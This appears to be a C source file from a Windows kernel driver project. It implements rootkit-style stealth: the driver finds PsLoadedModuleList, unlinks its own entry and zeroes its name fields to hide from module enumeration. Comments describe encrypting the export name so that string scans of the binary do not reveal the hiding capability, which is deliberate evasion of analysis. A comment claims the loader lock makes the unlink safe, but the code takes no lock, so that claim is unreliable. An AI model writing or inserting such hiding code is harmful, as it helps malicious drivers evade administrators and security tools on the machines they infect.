#include <ntddk.h>
#include <stdint.h>
#include "debug.h"
#include "common/yghv_strtab.h"

/*
 * minimal stealth. Unlink from PsLoadedModuleList.
 * Skip SCM key deletion (requires registry handle). Add when audit demands it.
 */

/* forward-declare only the fields we need from LDR_DATA_TABLE_ENTRY.
   Avoids ntifs.h / ntddk.h include conflict. Exact layout must match kernel. */
typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    PVOID GpValue;
    PVOID NonPagedDebugInfo;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

static void yghv_unlink_module(PDRIVER_OBJECT DriverObject) {
    PLIST_ENTRY head = NULL;
    UNICODE_STRING funcName;
    PKLDR_DATA_TABLE_ENTRY entry;
    PLIST_ENTRY le;

    /*
     * 9.590: the name comes from the encrypted table, not a literal.
     *
     * The literal was the last place a plaintext export name sat in this image,
     * and it is the least defensible one: "strings x.sys" showing the exact
     * export the driver resolves is enough to describe the module-unlink
     * capability without reading a single instruction.
     */
    {
        WCHAR wide[YGHV_STR_MAX_CHARS];

        if (!yghv_str_get_w(YGHV_SID_PSLOADEDMODULELIST, (unsigned short *)wide,
                            YGHV_STR_MAX_CHARS)) {
            LOG_ERROR("yghv_unlink: module-list name does not decode");
            return;
        }
        RtlInitUnicodeString(&funcName, wide);
    }
    head = (PLIST_ENTRY)MmGetSystemRoutineAddress(&funcName);
    if (!head) {
        LOG_INFO("yghv_unlink: module-list export not found");
        return;
    }

    for (le = head->Flink; le != head; le = le->Flink) {
        entry = CONTAINING_RECORD(le, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (entry->DllBase == DriverObject->DriverStart) {
            PLIST_ENTRY prev = le->Blink;
            PLIST_ENTRY next = le->Flink;

            prev->Flink = next;
            next->Blink = prev;
            le->Flink = le;
            le->Blink = le;

            RtlZeroMemory(&entry->BaseDllName, sizeof(entry->BaseDllName));
            RtlZeroMemory(&entry->FullDllName, sizeof(entry->FullDllName));

            LOG_INFO("yghv_unlink: removed from the load-order list");
            return;
        }
    }
    LOG_INFO("yghv_unlink: self not found in module list");
}

NTSTATUS yghv_loader_stealth(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    (void)RegistryPath;
    /* REV-017: DriverEntry is invoked while the system holds the loader lock,
       so the PsLoadedModuleList traversal/unlink in yghv_unlink_module is
       serialized against concurrent module load/unload.  Still only partial
       stealth (unlinks InLoadOrderLinks; name buffers are zeroed but the
       underlying strings remain, and other module lists are untouched) —
       keep gated; enabling it requires a kd `!driver` verification (P3). */
    yghv_unlink_module(DriverObject);
    return STATUS_SUCCESS;
}
